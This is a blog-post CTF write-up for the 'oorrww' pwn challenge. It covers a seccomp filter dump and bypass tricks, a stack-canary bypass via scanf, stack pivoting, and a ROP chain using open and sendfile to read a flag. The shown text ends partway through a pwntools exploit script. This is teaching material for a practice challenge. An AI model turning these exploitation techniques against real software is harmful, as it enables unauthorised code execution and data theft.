<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <meta content="#ffffff" name="theme-color" />
  <meta content="#da532c" name="msapplication-TileColor" />

  
  <link href='&#x2F;icons&#x2F;site.webmanifest' rel="manifest" />
  
  
  <link color="#5bbad5" href='&#x2F;icons&#x2F;safari-pinned-tab.svg' rel="mask-icon" />
  
  
  <link href='&#x2F;icons&#x2F;favicon-16x16.png' rel="icon" sizes="16x16" type="image/png" />
  
  
  <link href='&#x2F;icons&#x2F;favicon-32x32.png' rel="icon" sizes="32x32" type="image/png" />
  
  
  <link href='&#x2F;icons&#x2F;apple-touch-icon.png' rel="apple-touch-icon" sizes="180x180" />
  

  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/themes/folio/galleria.folio.min.css" integrity="sha384-+rY0QD+LRnTOquDMzGa9lXU6jIwdiQuwCJQ2cdcW0qeP/0UbjQCZlXnRsUMA+9pH" crossorigin="anonymous">
  

  

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jpswalsh/academicons@1.9.1/css/academicons.min.css" integrity="sha384-FIue+PI4SsI9XfHCz8dBLg33b0c1fMJgNU3X//L26FYbGnlSEfWmNT7zgWc2N9b6" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link href="https://movabs.github.io/deep-thought.css" rel="stylesheet" />
  
  

  <title>
    
Zanin | OORRWW

  </title>

  
  
  

  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css" integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>

  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mathtex-script-type.min.js" integrity="sha384-jiBVvJ8NGGj5n7kJaiWwWp9AjC+Yh8rhZY3GtAX8yU28azcLgoRo4oukO87g7zDT" crossorigin="anonymous"></script>
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
  
  
</head>

<body class="has-background-white">
  <nav aria-label="section navigation" class="navbar is-light" role="navigation">
    <div class="container">
      <div class="navbar-brand">
        <a class="navbar-item is-size-5 has-text-weight-bold" href="https:&#x2F;&#x2F;movabs.github.io">Zanin</a>
        <a aria-expanded="false" aria-label="menu" class="navbar-burger burger" data-target="navMenu" role="button">
          <span aria-hidden="true"></span>
          <span aria-hidden="true"></span>
          <span aria-hidden="true"></span>
        </a>
      </div>
      <div class="navbar-menu" id="navMenu">
        <div class="navbar-end has-text-centered">
          
          
          
          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;movabs.github.io&#x2F;">
            Home
          </a>
          
          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;movabs.github.io&#x2F;blog">
            Posts
          </a>
          
          
          
          <a class="navbar-item" id="nav-search" title="Search" data-target="#search-modal">
            <span class="icon">
              <i class="fas fa-search"></i>
            </span>
          </a>
          <a class="navbar-item" id="dark-mode" title="Switch to dark theme">
            <span class="icon">
              <i class="fas fa-adjust"></i>
            </span>
          </a>
        </div>
      </div>
    </div>
  </nav>

  
  

  
<section class="section">
  <div class="container">
    <div class="columns">
      <div class="column is-8 is-offset-2">
        <article class="box">
          <h1 class="title">
            OORRWW
          </h1>
          <p class="subtitle">Post description</p>
          <div class="columns is-multiline is-gapless">
            <div class="column is-8">
              
<span class="icon-text has-text-grey">
  <span class="icon">
    <i class="fas fa-user"></i>
  </span>
  <span>Hazhar Sabir published on</span>
  <span class="icon">
    <i class="far fa-calendar-alt"></i>
  </span>
  <span><time datetime="2024-01-15">January 15, 2024</time></span>
</span>

            </div>
            <div class="column is-4 has-text-right-desktop">
              
<span class="icon-text has-text-grey">
  <span class="icon">
    <i class="far fa-clock"></i>
  </span>
  <span>5 min,</span>
  <span class="icon">
    <i class="fas fa-pencil-alt"></i>
  </span>
  <span>808 words</span>
</span>

            </div>
            <div class="column">
              
            </div>
            <div class="column has-text-right-desktop">
              
            </div>
          </div>
          <div class="content mt-2">
            <h2 id="challenge">Challenge</h2>
<p><strong>open/read/write or just open&amp;send</strong></p>
<p>This is a pwn challenge from the <strong>l3akCTF</strong> first edition.</p>
<p>We are given an ELF binary, a libc, a Dockerfile and a docker-compose.</p>
<h2 id="enumeration">Enumeration:</h2>
<p>Running the binary, we get this:</p>
<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">lenart@xorr0r0:~/ctf/oorrww_dist$</span><span> ./oorrww
</span><span style="color:#bf616a;">here</span><span> are gifts for you: 6.95282314239992e-310 6.606487017994984e-310!
</span><span style="color:#bf616a;">input:
</span></code></pre>
<p>There are some double values that seem important, but we don’t know what they are just yet.
It then takes our input, and seemingly it takes numbers as input, not chars.</p>
<p>After playing around a bit, I realized it takes input in a loop, and after 22 inputs, it just crashes:</p>
<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">***</span><span> stack smashing detected ***: terminated
</span></code></pre>
<p>Great, but it looks like there is the stack canary enabled which makes it harder to create a classical
buffer overflow.</p>
<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">RELRO</span><span>         Full RELRO
</span><span style="color:#bf616a;">STACK</span><span> CANARY  Canary found
</span><span style="color:#bf616a;">NX</span><span>            NX enabled
</span><span style="color:#bf616a;">PIE</span><span>           PIE enabled
</span></code></pre>
<p>Let’s finally open it in Binja.</p>
<p>The main function:</p>
<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">b2</span><span>  int64_t </span><span style="color:#bf616a;">main</span><span>()
</span><span>
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">c1</span><span>      int32_t rdi
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">c1</span><span>      int32_t var_bc = rdi
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">c7</span><span>      int64_t rsi
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">c7</span><span>      int64_t var_c8 = rsi
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">ce</span><span>      </span><span style="color:#b48ead;">void</span><span>* fsbase
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">ce</span><span>      int64_t rax = *(fsbase + </span><span style="color:#d08770;">0x28</span><span>)
</span><span style="color:#d08770;">000013e2      </span><span style="color:#bf616a;">init</span><span>()
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">ec</span><span>      </span><span style="color:#bf616a;">sandbox</span><span>()
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">fb</span><span>      </span><span style="color:#b48ead;">void</span><span> var_a8
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">fb</span><span>      </span><span style="color:#bf616a;">gifts</span><span>(&amp;var_a8)
</span><span style="color:#d08770;">00001455      </span><span style="color:#b48ead;">for </span><span>(int32_t i = </span><span style="color:#d08770;">0</span><span>; i s&lt;= </span><span style="color:#d08770;">0x15</span><span>; i = i + </span><span style="color:#d08770;">1</span><span>)
</span><span style="color:#d08770;">00001416          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">input:</span><span>&quot;)
</span><span style="color:#d08770;">00001442          </span><span style="color:#bf616a;">__isoc99_scanf</span><span>(&amp;data_2035, sx.</span><span style="color:#bf616a;">q</span><span>(i &lt;&lt; </span><span style="color:#d08770;">3</span><span>) + &amp;var_a8, &amp;var_a8)
</span><span style="color:#d08770;">00001457      </span><span>int64_t rax_8 = </span><span style="color:#d08770;">0
</span><span style="color:#d08770;">0000146</span><span style="background-color:#bf616a;color:#2b303b;">9</span><span>      </span><span style="color:#b48ead;">if </span><span>(rax != *(fsbase + </span><span style="color:#d08770;">0x28</span><span>))
</span><span style="color:#d08770;">0000146</span><span style="background-color:#bf616a;color:#2b303b;">b</span><span>          rax_8 = </span><span style="color:#bf616a;">__stack_chk_fail</span><span>()
</span><span style="color:#d08770;">00001471      </span><span style="color:#b48ead;">return</span><span> rax_8
</span></code></pre>
<p>Seeing the <code>sandbox()</code> function I realized not only it is protected by the stack canary and the other compiler’s protections
but also seemingly there is some sandboxing security measures.</p>
<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">lenart@xorr0r0:~/ctf/oorrww_dist$</span><span> seccomp-tools dump ./oorrww
</span><span> </span><span style="color:#bf616a;">line</span><span>  CODE  JT   JF      K
</span><span style="color:#65737e;">###==============================
</span><span> </span><span style="color:#bf616a;">0000:</span><span> 0x20 0x00 0x00 0x00000004  A = arch
</span><span> </span><span style="color:#bf616a;">0001:</span><span> 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) </span><span style="color:#bf616a;">goto</span><span> 0008
</span><span> </span><span style="color:#bf616a;">0002:</span><span> 0x20 0x00 0x00 0x00000000  A = sys_number
</span><span> </span><span style="color:#bf616a;">0003:</span><span> 0x35 0x00 0x01 0x40000000  if (A &lt; </span><span style="color:#d08770;">0</span><span>x40000000) </span><span style="color:#bf616a;">goto</span><span> 0005
</span><span> </span><span style="color:#bf616a;">0004:</span><span> 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) </span><span style="color:#bf616a;">goto</span><span> 0008
</span><span> </span><span style="color:#bf616a;">0005:</span><span> 0x15 0x02 0x00 0x0000003b  if (A </span><span style="color:#65737e;">## execve) goto 0008
</span><span> </span><span style="color:#bf616a;">0006:</span><span> 0x15 0x01 0x00 0x00000142  if (A </span><span style="color:#65737e;">## execveat) goto 0008
</span><span> </span><span style="color:#bf616a;">0007:</span><span> 0x06 0x00 0x00 0x7fff0000  return ALLOW
</span><span> </span><span style="color:#bf616a;">0008:</span><span> 0x06 0x00 0x00 0x00000000  return KILL
</span></code></pre>
<p>The trick to bypass seccomp rules is, If it doesn’t check for the arch type, we could simply call another arch instruction,
for example, call int 0x80 instead of syscall, or if it didn’t check for the syscall number greater than <code>0x40000000</code>,
we could pass <code>0x40000000 + SYSCALL_NUMBER</code> because apparently the Linux kernel ignores the high-order bits in the syscall number.
Another trick is to find other alternative system calls.</p>
<p>The challenge name gives some hints, <code>oorrww</code> is an abbreviation for <code>open/read/write</code>.</p>
<p>Getting back to Binja, we have:</p>
<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#bf616a;">main</span><span>()
</span><span>...
</span><span style="color:#bf616a;">gifts</span><span>(&amp;var_a8)
</span><span>...
</span><span>
</span><span style="color:#d08770;">00001331  </span><span>int64_t </span><span style="color:#bf616a;">gifts</span><span>(int64_t arg1)
</span><span style="color:#d08770;">00001341      </span><span style="color:#b48ead;">void</span><span>* fsbase
</span><span style="color:#d08770;">00001341      </span><span>int64_t rax = *(fsbase + </span><span style="color:#d08770;">0x28</span><span>)
</span><span style="color:#d08770;">00001357      </span><span>int64_t (* </span><span style="color:#b48ead;">const</span><span> var_28)() = __isoc99_scanf
</span><span style="color:#d08770;">0000137</span><span style="background-color:#bf616a;color:#2b303b;">e</span><span>      int512_t zmm1
</span><span style="color:#d08770;">0000137</span><span style="background-color:#bf616a;color:#2b303b;">e</span><span>      zmm1.</span><span style="color:#bf616a;">o </span><span>= zx.</span><span style="color:#bf616a;">o</span><span>(__isoc99_scanf)
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">9</span><span style="color:#d08770;">6      </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">here are gifts for you: </span><span style="color:#d08770;">%.16g</span><span style="color:#a3be8c;"> %.…</span><span>&quot;, arg1, zmm1)
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">a0</span><span>      int64_t rax_4 = rax - *(fsbase + </span><span style="color:#d08770;">0x28</span><span>)
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">a9</span><span>      </span><span style="color:#b48ead;">if </span><span>(rax != *(fsbase + </span><span style="color:#d08770;">0x28</span><span>))
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">ab</span><span>          rax_4 = </span><span style="color:#bf616a;">__stack_chk_fail</span><span>()
</span><span style="color:#d08770;">000013</span><span style="background-color:#bf616a;color:#2b303b;">b1</span><span>      </span><span style="color:#b48ead;">return</span><span> rax_4
</span></code></pre>
<p>So, the program leaks the address of the <code>var_a8</code> (which is the buffer where we write), and <code>__isoc99_scanf</code>.
Here is a script to convert the leaked addresses to hex:</p>
<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>fleak = io.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">decode</span><span>().</span><span style="color:#bf616a;">split</span><span>()
</span><span>buffer_leak = float.</span><span style="color:#bf616a;">hex</span><span>(</span><span style="color:#bf616a;">float</span><span>(fleak[</span><span style="color:#d08770;">5</span><span>]))
</span><span>buffer_leak = </span><span style="color:#bf616a;">int</span><span>(buffer_leak[</span><span style="color:#d08770;">5</span><span>:</span><span style="color:#d08770;">17</span><span>], </span><span style="color:#d08770;">16</span><span>)
</span><span>
</span><span>scanf_leak = float.</span><span style="color:#bf616a;">hex</span><span>(</span><span style="color:#bf616a;">float</span><span>(fleak[</span><span style="color:#d08770;">6</span><span>][:-</span><span style="color:#d08770;">1</span><span>]))
</span><span>scanf_leak = </span><span style="color:#bf616a;">int</span><span>(scanf_leak[</span><span style="color:#d08770;">5</span><span>:</span><span style="color:#d08770;">17</span><span>], </span><span style="color:#d08770;">16</span><span>)
</span></code></pre>
<p>Next, in the binary, we have:</p>
<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#d08770;">00001455      </span><span style="color:#b48ead;">for </span><span>(int32_t i = </span><span style="color:#d08770;">0</span><span>; i s&lt;= </span><span style="color:#d08770;">0x15</span><span>; i = i + </span><span style="color:#d08770;">1</span><span>)
</span><span style="color:#d08770;">00001416          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">input:</span><span>&quot;)
</span><span style="color:#d08770;">00001442          </span><span style="color:#bf616a;">__isoc99_scanf</span><span>(&amp;data_2035, sx.</span><span style="color:#bf616a;">q</span><span>(i &lt;&lt; </span><span style="color:#d08770;">3</span><span>) + &amp;var_a8, &amp;var_a8)
</span></code></pre>
<p>It takes our inputs up to 22 times, and it will eventually overflow the buffer.</p>
<p>We can use a trick to bypass the stack canary by confusing the <code>scanf</code> function[1]:</p>
<p>1: <a rel="noopener nofollow noreferrer" target="_blank" href="https://rehex.ninja/posts/scanf-and-hateful-dot/">pwn&gt; scanf and hateful dot</a></p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>+--------+
</span><span>| AAAAAA | &lt;- start of the buffer
</span><span>|   A    |
</span><span>|   A    |
</span><span>|   A    |
</span><span>|   A    |
</span><span>|   A    |
</span><span>|   .    | &lt;- Bypass the canary because scanf wouldn&#39;t write .
</span><span>| 0x1337 | &lt;- return address we can control and jump wherever we want
</span><span>+--------+
</span></code></pre>
<p>Now we have to deal with the fact that we only have 22 inputs, each of 8 bytes;
this means we only have one byte after the stack canary.</p>
<p>We can use the stack pivoting technique[2] to control a larger stack using the following gadget.</p>
<p>2: <a rel="noopener nofollow noreferrer" target="_blank" href="https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting/exploitation/leave">leave</a></p>
<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">lenart@xorr0r0:~/ctf/oorrww_dist$</span><span> ROPgadget</span><span style="color:#bf616a;"> --binary</span><span> oorrww
</span><span style="color:#bf616a;">0x00000000000012a3</span><span> : leave ; </span><span style="color:#bf616a;">ret
</span></code></pre>
<p>That is good, we can fill our buffer with a ROP chain and then pivot the stack to the start of the buffer.</p>
<p>Here is what happens to the stack:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>+---------+
</span><span>|    A    | &lt;- start of the buffer
</span><span>|    A    |
</span><span>|    A    |
</span><span>|    A    |
</span><span>|    A    |
</span><span>|    A    |
</span><span>|    .    | &lt;- Bypass the canary because scanf woudldn&#39;t write .
</span><span>|  0x1337 | &lt;- address of leave; ret ----&gt;----
</span><span>+---------+                                  |
</span><span>                                             |
</span><span>                 rbp aka base pointer -&gt;  +------+ &lt;- A stack that we don&#39;t control
</span><span>                                          |      |
</span><span>                                          |      |
</span><span>                                          |      |
</span><span>                                          +------+
</span></code></pre>
<p>Here is what is happening when calling <code>leave; ret</code> instruction:</p>
<pre data-lang="asm" style="background-color:#2b303b;color:#c0c5ce;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#b48ead;">mov </span><span style="color:#bf616a;">rsp</span><span>, </span><span style="color:#bf616a;">rbp
</span><span style="color:#b48ead;">pop </span><span style="color:#bf616a;">rbp
</span></code></pre>
<h2 id="leak-libc-and-exploit-using-rop-chain">Leak libc and exploit using ROP chain:</h2>
<h3 id="leak-libc">Leak libc:</h3>
<p>We can get the libc base address using the <code>scanf</code> leaked address.</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>libc.base = scanf_leaked_address - scanf_offset_in_libc
</span></code></pre>
<p>And from this we can find every gadget in the libc using <code>libc.base + gadget_offset</code>.</p>
<h3 id="rop-chain">ROP chain:</h3>
<p>The idea of ROP chain is as following:</p>
<pre data-lang="asm" style="background-color:#2b303b;color:#c0c5ce;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#b48ead;">pop </span><span style="color:#bf616a;">rax</span><span style="color:#65737e;">     ; move the first value in the stack into rax
</span><span style="color:#b48ead;">ret</span><span style="color:#65737e;">         ; pop return address from rbp and return to it.
</span></code></pre>
<p>We can chain the gadgets to control the registers and call the system calls or libc functions.</p>
<p>EX:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>Addresses |                                        The stack
</span><span>          |                                 +--------------------+
</span><span>          | pop rax ----------------------&gt; |         2          |
</span><span>          |                                 +--------------------+
</span><span>          | ret --------------------------&gt; |        0x42        |
</span><span>          |                                 +--------------------+
</span><span>  0x42    | pop rdi ----------------------&gt; | 0x7478742e67616c66 + -&gt; flag.txt----&gt; The addresss pointing to flag.txt
</span><span>          |                                 +--------------------+
</span><span>          | ret --------------------------&gt; |       0x1337       |
</span><span>          |                                 +--------------------+
</span><span> 0x1337   | pop rsi ----------------------&gt; |         0          |
</span><span>          |                                 +--------------------+
</span><span>          | ret --------------------------&gt; |      0xca11        |
</span><span>          |                                 +--------------------+
</span><span> 0xca11   | syscall
</span></code></pre>
<p>The above figure shows how to set some registers and call open syscall. Under linux x64_86, each syscall
has a specific number and the rax register used to register the number of the desired syscall, which is 2
in the case of <code>open</code> according linux system call table[3].
If you want to see them by yourself, you can navigate somewhere around <code>/usr/src/(kernel_name)/arch/x86/entry/syscalls/syscall_64.tbl</code>.</p>
<p>3: <a rel="noopener nofollow noreferrer" target="_blank" href="https://filippo.io/linux-syscall-table/">Linux syscall table</a></p>
<h3 id="the-strategy">The strategy</h3>
<ol>
<li>We can only write eight bytes at a time, so we can write <code>flag.txt</code> at the start of our buffer as this strings
is required by the open syscall, and we don’t have it in the binary file.</li>
<li>Open requires a null terminated string. However, the stack has garbage on it, so when writing it at the start of the stack,
it is not null terminated, so the next eight bytes should contain a null byte.</li>
<li>Having <code>flag.txt\0</code> on the top of the stack. We can fill the rest of the stack with a rop chain to open/read/write it.</li>
<li>bypass the canary with a <code>.</code>.</li>
<li>We have an extra 16 bytes to pivot the stack and change <code>ret</code> address. First, we put the address of the buffer
leaked by the program  <code>+ 8</code> (We don’t want to jump to 0x0 null byte terminator of flag.txt as it is at the top of the stack)
so <code>leave</code> will pivot our stack to the start of our rop chain.</li>
<li>We change the <code>ret</code> to the <code>leave; ret</code> gadget address.</li>
</ol>
<p>We still have a tiny stack space in which we can’t fit <code>open/read/write</code> system calls.</p>
<p>Instead, we can open the flag file and use <code>sendfile</code> system call, saving us some space on the stack.</p>
<p>The man of <code>sendfile</code> says:</p>
<pre data-lang="man" style="background-color:#2b303b;color:#c0c5ce;" class="language-man "><code class="language-man" data-lang="man"><span>       sendfile() copies data between one file descriptor and another.
</span><span>       Because this copying is done within the kernel, sendfile() is
</span><span>       more efficient than the combination of read(2) and write(2),
</span><span>       which would require transferring data to and from user space.
</span><span>
</span><span>       in_fd should be a file descriptor opened for reading and out_fd
</span><span>       should be a descriptor opened for writing.
</span></code></pre>
<p>The <code>sendfile</code> prototype is:</p>
<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>ssize_t </span><span style="color:#8fa1b3;">sendfile</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">out_fd</span><span>, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">in_fd</span><span>, off_t *</span><span style="color:#bf616a;">offset</span><span>, size_t </span><span style="color:#bf616a;">count</span><span>);
</span></code></pre>
<pre data-lang="asm" style="background-color:#2b303b;color:#c0c5ce;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#8fa1b3;">%</span><span style="color:#bf616a;">rax </span><span style="color:#d08770;">40
</span><span style="color:#8fa1b3;">%</span><span style="color:#bf616a;">rdi </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">out_fd
</span><span style="color:#8fa1b3;">%</span><span style="color:#bf616a;">rsi </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">in_fd
</span><span style="color:#8fa1b3;">%</span><span style="color:#bf616a;">rdx </span><span style="color:#8fa1b3;">loff_t </span><span>*</span><span style="color:#8fa1b3;">offset
</span><span style="color:#8fa1b3;">%</span><span style="color:#bf616a;">r10  </span><span style="color:#8fa1b3;">size_t count
</span></code></pre>
<p>And we have this gadget to control the registers:</p>
<pre data-lang="asm" style="background-color:#2b303b;color:#c0c5ce;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#d08770;">0x0000000000119170</span><span style="color:#8fa1b3;">: endbr64</span><span style="color:#65737e;">; mov r10, rcx; mov eax, 0x28; syscall;
</span></code></pre>
<h3 id="exploitation">Exploitation</h3>
<p>With all that, here is the final unformatted script:</p>
<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;">#!/usr/bin/env python3
</span><span style="color:#65737e;"># -*- coding: utf-8 -*-
</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
</span><span style="color:#b48ead;">import </span><span>struct
</span><span>
</span><span style="color:#65737e;">#context.terminal = &#39;kitty&#39;
</span><span>context.terminal = [&quot;</span><span style="color:#a3be8c;">tmux</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">splitw</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">-h</span><span>&quot;]
</span><span>logger = logging.</span><span style="color:#bf616a;">getLogger</span><span>(__name__)
</span><span>
</span><span>exe = context.binary = </span><span style="color:#bf616a;">ELF</span><span>(args.</span><span style="color:#bf616a;">EXE </span><span>or &#39;</span><span style="color:#a3be8c;">./oorrww_patched</span><span>&#39;)
</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-2.35.so</span><span>&quot;)
</span><span>
</span><span>io = </span><span style="color:#bf616a;">process</span><span>([exe.path])
</span><span style="color:#65737e;">#io = remote(&#39;193.148.168.30&#39;, 7666)
</span><span style="color:#65737e;">#gdb.attach(io, gdbscript=gdbscript)
</span><span>
</span><span>fleak = io.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">decode</span><span>().</span><span style="color:#bf616a;">split</span><span>()
</span><span>buffer_leak = float.</span><span style="color:#bf616a;">hex</span><span>(</span><span style="color:#bf616a;">float</span><span>(fleak[</span><span style="color:#d08770;">5</span><span>]))
</span><span>buffer_leak = </span><span style="color:#bf616a;">int</span><span>(buffer_leak[</span><span style="color:#d08770;">5</span><span>:</span><span style="color:#d08770;">17</span><span>], </span><span style="color:#d08770;">16</span><span>)
</span><span>
</span><span>scanf_leak = float.</span><span style="color:#bf616a;">hex</span><span>(</span><span style="color:#bf616a;">float</span><span>(fleak[</span><span style="color:#d08770;">6</span><span>][:-</span><span style="color:#d08770;">1</span><span>]))
</span><span>scanf_leak = </span><span style="color:#bf616a;">int</span><span>(scanf_leak[</span><span style="color:#d08770;">5</span><span>:</span><span style="color:#d08770;">17</span><span>], </span><span style="color:#d08770;">16</span><span>)
</span><span>
</span><span>libc.address = scanf_leak - libc.symbols[&#39;</span><span style="color:#a3be8c;">__isoc99_scanf</span><span>&#39;]
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">LIBC @ </span><span style="color:#d08770;">{}</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(libc.address)))
</span><span>
</span><span>rop = </span><span style="color:#bf616a;">ROP</span><span>(libc)
</span><span>pop_rdi = (rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&#39;</span><span style="color:#a3be8c;">pop rdi</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">ret</span><span>&#39;]))[</span><span style="color:#d08770;">0</span><span>]
</span><span>pop_rsi = (rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&#39;</span><span style="color:#a3be8c;">pop rsi</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">ret</span><span>&#39;]))[</span><span style="color:#d08770;">0</span><span>]
</span><span>pop_rax = (rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&#39;</span><span style="color:#a3be8c;">pop rax</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">ret</span><span>&#39;]))[</span><span style="color:#d08770;">0</span><span>]
</span><span>pop_rdx = libc.address + </span><span style="color:#d08770;">0x11f2e7
</span><span>syscall = (rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&#39;</span><span style="color:#a3be8c;">syscall</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">ret</span><span>&#39;]))[</span><span style="color:#d08770;">0</span><span>]
</span><span>leave_ret = (rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&#39;</span><span style="color:#a3be8c;">leave</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">ret</span><span>&#39;]))[</span><span style="color:#d08770;">0</span><span>]
</span><span>ret = (rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&#39;</span><span style="color:#a3be8c;">ret</span><span>&#39;]))[</span><span style="color:#d08770;">0</span><span>]
</span><span>
</span><span>gdbscript=&quot;&quot;&quot;
</span><span style="color:#a3be8c;">b *</span><span style="color:#d08770;">{}
</span><span style="color:#a3be8c;">b *</span><span style="color:#d08770;">{}
</span><span>&quot;&quot;&quot;.</span><span style="color:#bf616a;">format</span><span>(leave_ret, syscall)
</span><span style="color:#65737e;">#gdb.attach(io, gdbscript=gdbscript)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">pack_input</span><span>(</span><span style="color:#bf616a;">data</span><span>):
</span><span>    val = </span><span style="color:#bf616a;">p64</span><span>(data).</span><span style="color:#bf616a;">hex</span><span>()
</span><span>    </span><span style="color:#b48ead;">return </span><span>(struct.</span><span style="color:#bf616a;">unpack</span><span>(&#39;</span><span style="color:#a3be8c;">d</span><span>&#39;, bytes.</span><span style="color:#bf616a;">fromhex</span><span>(val))[</span><span style="color:#d08770;">0</span><span>])
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_string</span><span>(</span><span style="color:#bf616a;">string</span><span>):
</span><span>    f = string.</span><span style="color:#bf616a;">encode</span><span>().</span><span style="color:#bf616a;">hex</span><span>()
</span><span>    ba = bytearray.</span><span style="color:#bf616a;">fromhex</span><span>(f)
</span><span>    ba.</span><span style="color:#bf616a;">reverse</span><span>()
</span><span>    s = &#39;&#39;.</span><span style="color:#bf616a;">join</span><span>(</span><span style="color:#96b5b4;">format</span><span>(x, &quot;</span><span style="color:#a3be8c;">02x</span><span>&quot;) </span><span style="color:#b48ead;">for </span><span>x </span><span style="color:#b48ead;">in </span><span>ba)
